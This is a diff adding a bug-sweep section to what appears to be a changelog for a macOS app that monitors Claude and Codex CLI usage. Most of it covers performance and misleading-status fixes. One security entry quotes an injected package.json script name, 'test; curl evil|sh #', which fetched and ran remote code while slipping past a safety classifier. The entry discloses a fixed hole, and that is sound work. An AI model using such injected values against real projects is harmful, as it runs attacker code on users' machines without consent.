@@ -18,6 +18,57 @@ Codex CLI logs on macOS (Apple Silicon).
 
 Version lines at this point: **core 0.1.0**, **protocol 1.0.0**, app pre-release.
 
+### Bug sweep rounds 1-2 (app 0.23.0-0.24.0 / protocol 1.16.0)
+
+Four adversarial reviewers swept performance, Swift correctness, Rust robustness
+and security. Every finding was reproduced before it was fixed.
+
+**Security**
+- **A hostile `package.json` could run a command with no confirmation.** A script
+  named `test; curl evil|sh #` became `npm run test; curl evil|sh #`, which the
+  safety classifier read as **read_only** (it sees the token "test") and labelled
+  **"Test"** — so it landed on the prominent Test Project button and bypassed the
+  confirmation dialog entirely. The Makefile/justfile/Taskfile parsers all validate
+  their keys; the package.json loop didn't. Now whitelisted.
+
+**Performance**
+- **Every refresh scanned your logs twice.** `record_history` builds its own
+  snapshot, so calling it after `get_usage_snapshot` re-read gigabytes a second
+  time, every 2 minutes. Protocol 1.16.0 lets the snapshot op record history from
+  the snapshot it already has — one scan.
+- Run console no longer rebuilds up to 2,000 selectable text views on every output
+  chunk (it stuttered exactly while output streamed). Stack Health no longer
+  re-fetches ~1,000 npm/crates requests on every Advisor tab switch. Discover no
+  longer re-runs the whole radar on every visit. The Keychain probe moved off the
+  main thread.
+
+**Things the app was saying that weren't true**
+- **Expired limit windows were reported as current — on Claude *and* Codex.** A
+  window past its reset isn't stale, it's wrong (usage restarts at zero). Claude
+  replayed a cached 5-hour window 3 days after it expired; Codex would replay one
+  for weeks and raise a **false critical alert + notification** from it.
+- **A severity escalation never notified.** Alert ids are stable across severity,
+  so you'd be warned at 85% of budget and never told you blew it — and warned at
+  80% of a limit but never at 96%. The gate now keys on severity too.
+- **"Resets just now."** for a reset days away — a past-tense formatter used on a
+  future date, in alerts and macOS notification bodies.
+- **Discover could show a green "all clear, scanned 0 projects"** when the core had
+  actually returned an *error*: the decoder defaulted every field, so an error
+  payload decoded as an empty report.
+- **Missions could show a green "verified" tick** from a run it couldn't place in
+  time (unknown session start defaulted to "after"). Absence of evidence is now
+  reported as absence.
+- **A run you cancelled could be recorded as "Test failed"** — the stop intent lost
+  a race with the SIGTERM reap.
+- **The radar claimed generated folders weren't gitignored when git says they are**
+  (`**/node_modules`, `dist/**` — mainstream globs a line-comparison missed). It
+  now asks `git check-ignore`.
+- **Linked worktrees and submodules were reported as having no git remote** — their
+  `.git` is a *file*, not a directory, so we bailed. StackPulse creates linked
+  worktrees itself, so this was self-inflicted.
+
+180 tests passing (workspace), 0 clippy warnings, fmt clean.
+
 ### Fix: launching Terminal froze the app for ~20 seconds (app 0.22.2)
 
 - **The bug you hit.** Every "Launch", "Run in Terminal", "Restore" and worktree
